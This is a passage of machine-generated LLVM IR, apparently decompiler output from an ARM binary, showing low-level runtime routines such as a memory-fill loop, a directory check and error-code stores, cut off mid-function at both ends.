  store i32 %v2_bcac, i32* @r4, align 4
  %v1_bcb8 = load i32, i32* @r5, align 4
  %v2_bcb8 = add i32 %v1_bcb8, 12
  %v3_bcb8 = inttoptr i32 %v2_bcb8 to i32*
  store i32 %v2_bcac, i32* %v3_bcb8, align 4
  br i1 %v2_bcb0, label %dec_label_pc_bcc0, label %dec_label_pc_bcd0

dec_label_pc_bcc0:                                ; preds = %bb17
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* @r0, align 4
  %v0_bcc4 = call i32 @function_d458()
  %v0_bcc8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_bd08

dec_label_pc_bcd0:                                ; preds = %bb17
  %v0_bcd4 = load i32, i32* @r6, align 4
  %v2_bcd4 = add i32 %v0_bcd4, -34032
  store i32 %v2_bcd4, i32* %r3.global-to-local, align 4
  %v1_bcdc = inttoptr i32 %v2_bcd4 to i32*
  %v2_bcdc = load i32, i32* %v1_bcdc, align 4
  %v3_bcdc = add i32 %v0_bcd4, -34028
  %v4_bcdc = inttoptr i32 %v3_bcdc to i32*
  %v5_bcdc = load i32, i32* %v4_bcdc, align 4
  store i32 %v5_bcdc, i32* %r1.global-to-local, align 4
  %v6_bcdc = add i32 %v0_bcd4, -34024
  %v7_bcdc = inttoptr i32 %v6_bcdc to i32*
  %v8_bcdc = load i32, i32* %v7_bcdc, align 4
  store i32 %v8_bcdc, i32* %r2.global-to-local, align 4
  %v9_bcdc = add i32 %v0_bcd4, -34020
  %v10_bcdc = inttoptr i32 %v9_bcdc to i32*
  %v11_bcdc = load i32, i32* %v10_bcdc, align 4
  store i32 %v11_bcdc, i32* %r3.global-to-local, align 4
  %v12_bcdc = add i32 %v0_bcd4, -34016
  %v1_bce8 = inttoptr i32 %v12_bcdc to i32*
  %v2_bce8 = load i32, i32* %v1_bce8, align 4
  %v3_bce8 = add i32 %v0_bcd4, -34012
  %v4_bce8 = inttoptr i32 %v3_bce8 to i32*
  %v5_bce8 = load i32, i32* %v4_bce8, align 4
  store i32 %v2_bce8, i32* %stack_var_-32, align 4
  store i32 %v5_bcdc, i32* %r1.global-to-local, align 4
  store i32 %v8_bcdc, i32* %r2.global-to-local, align 4
  store i32 %v11_bcdc, i32* %r3.global-to-local, align 4
  %v0_bcf8 = load i32, i32* @r5, align 4
  %v1_bcf8 = add i32 %v0_bcf8, 24
  %v1_bcfc = inttoptr i32 %v1_bcf8 to i32*
  store i32 %v2_bcdc, i32* %v1_bcfc, align 4
  %v3_bcfc = add i32 %v0_bcf8, 28
  %v4_bcfc = inttoptr i32 %v3_bcfc to i32*
  %v5_bcfc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_bcfc, i32* %v4_bcfc, align 4
  %v6_bcfc = add i32 %v0_bcf8, 32
  %v7_bcfc = inttoptr i32 %v6_bcfc to i32*
  %v8_bcfc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_bcfc, i32* %v7_bcfc, align 4
  %v9_bcfc = add i32 %v0_bcf8, 36
  %v10_bcfc = inttoptr i32 %v9_bcfc to i32*
  %v11_bcfc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_bcfc, i32* %v10_bcfc, align 4
  %v12_bcfc = add i32 %v0_bcf8, 40
  %v2_bd00 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_bce8, i32* %r1.global-to-local, align 4
  %v1_bd04 = inttoptr i32 %v12_bcfc to i32*
  store i32 %v2_bd00, i32* %v1_bd04, align 4
  %v3_bd04 = add i32 %v0_bcf8, 44
  %v4_bd04 = inttoptr i32 %v3_bd04 to i32*
  %v5_bd04 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_bd04, i32* %v4_bd04, align 4
  %v0_bd08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bd08

dec_label_pc_bd08:                                ; preds = %bb, %dec_label_pc_bcc0, %dec_label_pc_bcd0
  %v0_bd08 = phi i32 [ 0, %bb ], [ %v0_bcc8, %dec_label_pc_bcc0 ], [ %v0_bd08.pre, %dec_label_pc_bcd0 ]
  store i32 %v3_bc50, i32* @r4, align 4
  store i32 %v6_bc50, i32* @r5, align 4
  store i32 %v9_bc50, i32* @r6, align 4
  store i32 %v12_bc50, i32* @r7, align 4
  ret i32 %v0_bd08

; uselistorder directives
  uselistorder i32 %v2_bcac, { 1, 0, 2 }
  uselistorder i32 %v1_bc64, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bd08, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_bd20(i32 %arg1) local_unnamed_addr {
dec_label_pc_bd20:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_bd20 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_bd28 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_bd58, label %dec_label_pc_bd40

dec_label_pc_bd40:                                ; preds = %dec_label_pc_bd20
  %v0_bd44 = call i32 @function_f150()
  %v3_bd48 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_bd48 = sext i16 %v3_bd48 to i32
  %v0_bd4c = load i32, i32* %r2.global-to-local, align 4
  %v1_bd4c = sub i32 0, %v0_bd4c
  store i32 %v1_bd4c, i32* %r2.global-to-local, align 4
  %v3_bd50 = add i32 %v4_bd48, %v0_bd44
  %v4_bd50 = inttoptr i32 %v3_bd50 to i32*
  store i32 %v1_bd4c, i32* %v4_bd50, align 4
  br label %dec_label_pc_bd7c

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd20
  store i32 %arg1, i32* @r7, align 4
  %v1_bd58 = icmp slt i32 %arg1, 0
  br i1 %v1_bd58, label %dec_label_pc_bd7c, label %dec_label_pc_bd60

dec_label_pc_bd60:                                ; preds = %dec_label_pc_bd58
  store i32 %v2_bd28, i32* @r1, align 4
  %v0_bd64 = call i32 @function_f208()
  %v1_bd68 = icmp slt i32 %v0_bd64, 0
  br i1 %v1_bd68, label %dec_label_pc_bd70, label %dec_label_pc_bd84

dec_label_pc_bd70:                                ; preds = %dec_label_pc_bd60
  br label %dec_label_pc_bd7c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_bd70, %dec_label_pc_bd58, %dec_label_pc_bd40
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bdc8

dec_label_pc_bd84:                                ; preds = %dec_label_pc_bd60
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_bd8c = load i32, i32* @r7, align 4
  %v3_bd90 = call i32 @function_b714(i32 %v0_bd8c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_bd98 = load i32, i32* @r7, align 4
  %v2_bd9c = call i32 @function_bc50(i32 %v0_bd98, i32 %tmp)
  store i32 %v2_bd9c, i32* %r1.global-to-local, align 4
  %v2_bda0 = icmp eq i32 %v2_bd9c, 0
  br i1 %v2_bda0, label %dec_label_pc_bda8, label %dec_label_pc_bdc8

dec_label_pc_bda8:                                ; preds = %dec_label_pc_bd84
  %v0_bdb8 = call i32 @function_f150()
  %v3_bdbc = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_bdbc = sext i16 %v3_bdbc to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_bdc4 = add i32 %v4_bdbc, %v0_bdb8
  %v4_bdc4 = inttoptr i32 %v3_bdc4 to i32*
  store i32 12, i32* %v4_bdc4, align 4
  %v0_bdc8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bdc8

dec_label_pc_bdc8:                                ; preds = %dec_label_pc_bd84, %dec_label_pc_bd7c, %dec_label_pc_bda8
  %v0_bdc8 = phi i32 [ %v2_bd9c, %dec_label_pc_bd84 ], [ 0, %dec_label_pc_bd7c ], [ %v0_bdc8.pre, %dec_label_pc_bda8 ]
  store i32 %v3_bd20, i32* @r7, align 4
  ret i32 %v0_bdc8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_bdc8, { 2, 0, 1 }
}

define i32 @function_bdd8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_bdd8:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_bdd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_bdd8, label %bb, label %dec_label_pc_bdd8..thread1_crit_edge

dec_label_pc_bdd8..thread1_crit_edge:             ; preds = %dec_label_pc_bdd8
  br label %.thread1

bb:                                               ; preds = %dec_label_pc_bdd8
  %v1_bdd8 = load i32, i32* @r8, align 4
  %v5_bdd8 = mul i32 %arg1, 65536
  %v6_bdd8 = and i32 %v1_bdd8, %v5_bdd8
  %v1_bddc = load i32, i32* %r1.global-to-local, align 4
  %v5_bddc = mul i32 %v1_bdd8, 2048
  %v6_bddc = and i32 %v1_bddc, %v5_bddc
  %v3_bde0 = load i32, i32* @r5, align 4
  %v8_bde0 = shl i32 %v6_bdd8, %v3_bde0
  %v9_bde0 = and i32 %v6_bddc, %v8_bde0
  store i32 %v9_bde0, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_bdd8..thread1_crit_edge, %bb
  %v2_bde8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_bde8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_bdf4 = call i32 @function_f208()
  store i32 %v0_bdf4, i32* @r5, align 4
  %v2_bdf8 = icmp eq i32 %v0_bdf4, 0
  br i1 %v2_bdf8, label %dec_label_pc_be00, label %dec_label_pc_be78

dec_label_pc_be00:                                ; preds = %.thread1
  %v1_be04 = and i32 %tmp6, 61440
  store i32 %v1_be04, i32* @r3, align 4
  %v7_be08 = icmp eq i32 %v1_be04, 16384
  br i1 %v7_be08, label %dec_label_pc_be28, label %dec_label_pc_be10

dec_label_pc_be10:                                ; preds = %dec_label_pc_be00
  %v0_be14 = call i32 @function_f150()
  %v3_be18 = load i16, i16* @global_var_1d2d8.209, align 2
  %v0_be1c = load i32, i32* @r5, align 4
  store i32 %v0_be1c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_be5c

dec_label_pc_be28:                                ; preds = %dec_label_pc_be00
  %v0_be28 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_be30 = call i32 @function_b7ac(i32 %v0_be28, i32 3)
  %v7_be34 = icmp eq i32 %v2_be30, -1
  br i1 %v7_be34, label %dec_label_pc_be78, label %dec_label_pc_be3c

dec_label_pc_be3c:                                ; preds = %dec_label_pc_be28
  %v1_be3c = urem i32 %v2_be30, 4
  store i32 %v1_be3c, i32* %r3.global-to-local, align 4
  %v7_be40 = icmp eq i32 %v1_be3c, 1
  br i1 %v7_be40, label %dec_label_pc_be48, label %dec_label_pc_be64

dec_label_pc_be48:                                ; preds = %dec_label_pc_be3c
  %v0_be4c = call i32 @function_f150()
  %v3_be50 = load i16, i16* @global_var_1d2d8.209, align 2
  %v0_be54 = load i32, i32* @r5, align 4
  store i32 %v0_be54, i32* %r1.global-to-local, align 4
  %v0_be58 = load i32, i32* %r3.global-to-local, align 4
  %v1_be58 = add i32 %v0_be58, 21
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be10, %dec_label_pc_be48
  %v2_be5c.in = phi i16 [ %v3_be18, %dec_label_pc_be10 ], [ %v3_be50, %dec_label_pc_be48 ]
  %v1_be5c = phi i32 [ %v0_be14, %dec_label_pc_be10 ], [ %v0_be4c, %dec_label_pc_be48 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_be10 ], [ %v1_be58, %dec_label_pc_be48 ]
  %v2_be5c = sext i16 %v2_be5c.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_be5c = add i32 %v1_be5c, %v2_be5c
  %v4_be5c = inttoptr i32 %v3_be5c to i32*
  store i32 %storemerge, i32* %v4_be5c, align 4
  %v0_be7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_be7c

dec_label_pc_be64:                                ; preds = %dec_label_pc_be3c
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_be68 = load i32, i32* @r4, align 4
  %v2_be6c = call i32 @function_bc50(i32 %v0_be68, i32 %tmp)
  store i32 %v2_be6c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_be7c

dec_label_pc_be78:                                ; preds = %.thread1, %dec_label_pc_be28
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_be7c

dec_label_pc_be7c:                                ; preds = %dec_label_pc_be64, %dec_label_pc_be5c, %dec_label_pc_be78
  %v0_be7c = phi i32 [ %v2_be6c, %dec_label_pc_be64 ], [ %v0_be7c.pre, %dec_label_pc_be5c ], [ 0, %dec_label_pc_be78 ]
  ret i32 %v0_be7c

; uselistorder directives
  uselistorder i32 %v1_be3c, { 1, 0 }
  uselistorder i32 %v2_be30, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 7, 5, 6, 8, 9, 0, 1 }
  uselistorder i32 (i32, i32)* @function_bc50, { 1, 0 }
  uselistorder i32 21, { 1, 0 }
  uselistorder i32 ()* @function_f208, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_be7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_be78, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_be94(i32* %arg1) local_unnamed_addr {
dec_label_pc_be94:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_be94 = load i32, i32* @r4, align 4
  %v6_be94 = load i32, i32* @r5, align 4
  %v9_be94 = load i32, i32* @r6, align 4
  %v12_be94 = load i32, i32* @r7, align 4
  %v15_be94 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r6, align 4
  %v1_bea8 = add i32 %tmp, 24
  store i32 %v1_bea8, i32* @r4, align 4
  %v4_beac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 68) to i32*), align 4
  store i32 %v4_beac, i32* %r1.global-to-local, align 4
  store i32 %v1_bea8, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_bec0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_bec0)
  %v0_bed4 = load i32, i32* @r6, align 4
  %v2_bed4 = add i32 %v0_bed4, 16
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  %v4_bed4 = load i32, i32* %v3_bed4, align 4
  call void @__pseudo_branch(i32 %v4_bed4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_bee4

dec_label_pc_bee4:                                ; preds = %dec_label_pc_bf14, %dec_label_pc_be94
  %v0_bee4 = load i32, i32* @r5, align 4
  %v1_bee4 = add i32 %v0_bee4, 4
  %v2_bee4 = inttoptr i32 %v1_bee4 to i32*
  %v3_bee4 = load i32, i32* %v2_bee4, align 4
  store i32 %v3_bee4, i32* %r2.global-to-local, align 4
  %v4_bee4 = add i32 %v0_bee4, 8
  %v5_bee4 = inttoptr i32 %v4_bee4 to i32*
  %v6_bee4 = load i32, i32* %v5_bee4, align 4
  %tmp10 = icmp ugt i32 %v6_bee4, %v3_bee4
  br i1 %tmp10, label %dec_label_pc_bf14, label %dec_label_pc_bef0

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bee4
  %v1_bef0 = inttoptr i32 %v0_bee4 to i32*
  %v2_bef0 = load i32, i32* %v1_bef0, align 4
  %v1_bef4 = add i32 %v0_bee4, 12
  %v2_bef4 = inttoptr i32 %v1_bef4 to i32*
  %v3_bef4 = load i32, i32* %v2_bef4, align 4
  store i32 %v3_bef4, i32* %r1.global-to-local, align 4
  %v1_bef8 = add i32 %v0_bee4, 20
  %v2_bef8 = inttoptr i32 %v1_bef8 to i32*
  %v3_bef8 = load i32, i32* %v2_bef8, align 4
  store i32 %v3_bef8, i32* %r2.global-to-local, align 4
  %v4_befc = call i32 @function_f26c(i32 %v2_bef0, i32 %v3_bef4, i32 %v3_bef8, i32 %v6_bee4)
  %tmp9 = icmp slt i32 %v4_befc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_bf0c

.thread:                                          ; preds = %dec_label_pc_bef0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_bf40

dec_label_pc_bf0c:                                ; preds = %dec_label_pc_bef0
  %v1_bf0c = load i32, i32* @r5, align 4
  %v2_bf0c = add i32 %v1_bf0c, 8
  %v3_bf0c = inttoptr i32 %v2_bf0c to i32*
  store i32 %v4_befc, i32* %v3_bf0c, align 4
  %v0_bf10 = load i32, i32* @r7, align 4
  %v1_bf10 = load i32, i32* @r5, align 4
  %v2_bf10 = add i32 %v1_bf10, 4
  %v3_bf10 = inttoptr i32 %v2_bf10 to i32*
  store i32 %v0_bf10, i32* %v3_bf10, align 4
  %v0_bf14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bf14

dec_label_pc_bf14:                                ; preds = %dec_label_pc_bee4, %dec_label_pc_bf0c
  %v1_bf24 = phi i32 [ %v0_bee4, %dec_label_pc_bee4 ], [ %v0_bf14.pre, %dec_label_pc_bf0c ]
  %v1_bf14 = add i32 %v1_bf24, 4
  %v2_bf14 = inttoptr i32 %v1_bf14 to i32*
  %v3_bf14 = load i32, i32* %v2_bf14, align 4
  store i32 %v3_bf14, i32* %r2.global-to-local, align 4
  %v1_bf18 = add i32 %v1_bf24, 12
  %v2_bf18 = inttoptr i32 %v1_bf18 to i32*
  %v3_bf18 = load i32, i32* %v2_bf18, align 4
  store i32 %v3_bf18, i32* %r1.global-to-local, align 4
  %v2_bf1c = add i32 %v3_bf18, %v3_bf14
  store i32 %v2_bf1c, i32* @r4, align 4
  %v1_bf20 = add i32 %v2_bf1c, 4
  %v2_bf20 = inttoptr i32 %v1_bf20 to i32*
  %v3_bf20 = load i32, i32* %v2_bf20, align 4
  %v2_bf24 = add i32 %v1_bf24, 16
  %v3_bf24 = inttoptr i32 %v2_bf24 to i32*
  store i32 %v3_bf20, i32* %v3_bf24, align 4
  %v0_bf28 = load i32, i32* @r4, align 4
  %v1_bf28 = add i32 %v0_bf28, 8
  %v2_bf28 = inttoptr i32 %v1_bf28 to i16*
  %v3_bf28 = load i16, i16* %v2_bf28, align 2
  %v4_bf28 = zext i16 %v3_bf28 to i32
  %v0_bf2c = load i32, i32* %r2.global-to-local, align 4
  %v1_bf2c = load i32, i32* %r1.global-to-local, align 4
  %v2_bf2c = add i32 %v1_bf2c, %v0_bf2c
  %v3_bf2c = inttoptr i32 %v2_bf2c to i32*
  %v4_bf2c = load i32, i32* %v3_bf2c, align 4
  store i32 %v4_bf2c, i32* %r1.global-to-local, align 4
  %v2_bf30 = add i32 %v0_bf2c, %v4_bf28
  %v2_bf34 = icmp eq i32 %v4_bf2c, 0
  %v1_bf38 = load i32, i32* @r5, align 4
  %v2_bf38 = add i32 %v1_bf38, 4
  %v3_bf38 = inttoptr i32 %v2_bf38 to i32*
  store i32 %v2_bf30, i32* %v3_bf38, align 4
  br i1 %v2_bf34, label %dec_label_pc_bee4, label %dec_label_pc_bf40

dec_label_pc_bf40:                                ; preds = %dec_label_pc_bf14, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_bf4c = load i32, i32* @r6, align 4
  %v2_bf4c = add i32 %v0_bf4c, 44
  %v3_bf4c = inttoptr i32 %v2_bf4c to i32*
  %v4_bf4c = load i32, i32* %v3_bf4c, align 4
  call void @__pseudo_branch(i32 %v4_bf4c)
  %v0_bf58 = load i32, i32* @r4, align 4
  store i32 %v3_be94, i32* @r4, align 4
  store i32 %v6_be94, i32* @r5, align 4
  store i32 %v9_be94, i32* @r6, align 4
  store i32 %v12_be94, i32* @r7, align 4
  store i32 %v15_be94, i32* @lr, align 4
  ret i32 %v0_bf58

; uselistorder directives
  uselistorder i32 %v1_bf24, { 0, 2, 1 }
  uselistorder i32 %v6_bee4, { 1, 0 }
  uselistorder i32 %v0_bee4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_bf14, { 1, 0 }
}

define i32 @function_bf6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_bf6c:
  %v0_bf6c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_bf6c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_bf6c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_bf6c, %bb
  %v4_bf78 = phi i32 [ %arg1, %dec_label_pc_bf6c ], [ 0, %bb ]
  ret i32 %v4_bf78

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_bf7c() local_unnamed_addr {
dec_label_pc_bf7c:
  %v0_bf7c = load i32, i32* @lr, align 4
  %v0_bf84 = call i32 @function_f150()
  %v3_bf88 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_bf88 = sext i16 %v3_bf88 to i32
  %v2_bf8c = add i32 %v4_bf88, %v0_bf84
  store i32 %v0_bf7c, i32* @lr, align 4
  ret i32 %v2_bf8c
}

define i32 @function_bf9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_bf9c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_bfa0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_bfa0, i32* @r0, align 4
  %v1_bfa8 = call i32 @function_f59c(i32 %v2_bfa0)
  %v2_bfac = load i32, i32* %stack_var_-24, align 4
  %v2_bfb0 = add i32 %v2_bfac, %tmp
  %v2_bfb8 = mul i32 %v2_bfb0, 10000
  %v1_bfbc = and i32 %v2_bfb8, 2147483632
  ret i32 %v1_bfbc

; uselistorder directives
  uselistorder i32 %v2_bfa0, { 1, 0 }
}

define i32 @function_bfd0() local_unnamed_addr {
dec_label_pc_bfd0:
  %v0_bfd0 = call i32 @function_11010()
  ret i32 %v0_bfd0
}

define i32 @function_bfe0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bfe0:
  %v0_bfe0 = call i32 @function_11010()
  ret i32 %v0_bfe0

; uselistorder directives
  uselistorder i32 ()* @function_11010, { 1, 0 }
}

define i32 @function_bff0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bff0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_bff4 = icmp eq i32 %arg3, 8
  store i1 %v8_bff4, i1* %cpsr_z.global-to-local, align 1
  %v5_bff8 = icmp slt i32 %arg3, 8
  br i1 %v5_bff8, label %dec_label_pc_c058, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bff0
  %v4_bffc = mul i32 %arg2, 256
  %v5_bffc = or i32 %v4_bffc, %arg2
  %v4_c000 = mul i32 %v5_bffc, 65536
  %v5_c000 = or i32 %v4_c000, %v5_bffc
  store i32 %v5_c000, i32* @r1, align 4
  %v1_c00457 = urem i32 %tmp, 4
  %v2_c00458 = icmp eq i32 %v1_c00457, 0
  store i1 %v2_c00458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_c00458, label %dec_label_pc_c014, label %bb

bb:                                               ; preds = %dec_label_pc_bffc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_bffc ]
  %v3_c00859 = phi i32 [ %v6_c008, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_bffc ]
  %v4_c008 = inttoptr i32 %v3_c00859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_c008, align 1
  %v5_c008 = load i32, i32* @r3, align 4
  %v6_c008 = add i32 %v5_c008, 1
  store i32 %v6_c008, i32* @r3, align 4
  %v0_c00c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_c018.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_c00c.pr, label %dec_label_pc_c014, label %.thread

.thread:                                          ; preds = %bb
  %v2_c00c = add i32 %v0_c018.pr.pre, -1
  store i32 %v2_c00c, i32* %r2.global-to-local, align 4
  %v1_c004 = urem i32 %v6_c008, 4
  %v2_c004 = icmp eq i32 %v1_c004, 0
  store i1 %v2_c004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c004, label %dec_label_pc_c014, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_c008.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_c008.pre to i8
  br label %bb

dec_label_pc_c014:                                ; preds = %.thread, %bb, %dec_label_pc_bffc
  %v0_c02028 = phi i32 [ %tmp, %dec_label_pc_bffc ], [ %v6_c008, %bb ], [ %v6_c008, %.thread ]
  %v0_c018.pr = phi i32 [ %arg3, %dec_label_pc_bffc ], [ %v0_c018.pr.pre, %bb ], [ %v2_c00c, %.thread ]
  %v0_c014 = load i32, i32* @r1, align 4
  store i32 %v0_c014, i32* %ip.global-to-local, align 4
  %v8_c01810 = icmp eq i32 %v0_c018.pr, 8
  store i1 %v8_c01810, i1* %cpsr_z.global-to-local, align 1
  %v5_c01c11 = icmp slt i32 %v0_c018.pr, 8
  br i1 %v5_c01c11, label %dec_label_pc_c058, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %dec_label_pc_c014
  %v1_c02046 = inttoptr i32 %v0_c02028 to i32*
  store i32 %v0_c014, i32* %v1_c02046, align 4
  %v3_c02047 = add i32 %v0_c02028, 4
  %v4_c02048 = inttoptr i32 %v3_c02047 to i32*
  %v5_c02049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_c02049, i32* %v4_c02048, align 4
  %v6_c02050 = add i32 %v0_c02028, 8
  store i32 %v6_c02050, i32* @r3, align 4
  %v0_c02451 = load i32, i32* %r2.global-to-local, align 4
  %v1_c02452 = add i32 %v0_c02451, -8
  store i32 %v1_c02452, i32* %r2.global-to-local, align 4
  %v5_c02c53 = icmp slt i32 %v1_c02452, 8
  br i1 %v5_c02c53, label %dec_label_pc_c020.dec_label_pc_c058.loopexit_crit_edge, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020.preheader, %dec_label_pc_c018.dec_label_pc_c020_crit_edge
  %v6_c02055 = phi i32 [ %v6_c020, %dec_label_pc_c018.dec_label_pc_c020_crit_edge ], [ %v6_c02050, %dec_label_pc_c020.preheader ]
  %v0_c02054 = phi i32 [ %v12_c04c, %dec_label_pc_c018.dec_label_pc_c020_crit_edge ], [ %v0_c02028, %dec_label_pc_c020.preheader ]
  %v1_c030 = inttoptr i32 %v6_c02055 to i32*
  %v2_c030 = load i32, i32* @r1, align 4
  store i32 %v2_c030, i32* %v1_c030, align 4
  %v3_c030 = add i32 %v0_c02054, 12
  %v4_c030 = inttoptr i32 %v3_c030 to i32*
  %v5_c030 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_c030, i32* %v4_c030, align 4
  %v6_c030 = add i32 %v0_c02054, 16
  store i32 %v6_c030, i32* @r3, align 4
  %v0_c034 = load i32, i32* %r2.global-to-local, align 4
  %v1_c034 = add i32 %v0_c034, -8
  store i32 %v1_c034, i32* %r2.global-to-local, align 4
  %v5_c03c = icmp slt i32 %v1_c034, 8
  br i1 %v5_c03c, label %dec_label_pc_c030.dec_label_pc_c058.loopexit_crit_edge, label %dec_label_pc_c040

dec_label_pc_c040:                                ; preds = %dec_label_pc_c030
  %v1_c040 = inttoptr i32 %v6_c030 to i32*
  %v2_c040 = load i32, i32* @r1, align 4
  store i32 %v2_c040, i32* %v1_c040, align 4
  %v3_c040 = add i32 %v0_c02054, 20
  %v4_c040 = inttoptr i32 %v3_c040 to i32*
  %v5_c040 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_c040, i32* %v4_c040, align 4
  %v6_c040 = add i32 %v0_c02054, 24
  store i32 %v6_c040, i32* @r3, align 4
  %v0_c044 = load i32, i32* %r2.global-to-local, align 4
  %v1_c044 = add i32 %v0_c044, -8
  store i32 %v1_c044, i32* %r2.global-to-local, align 4
  %v5_c04c = icmp slt i32 %v1_c044, 8
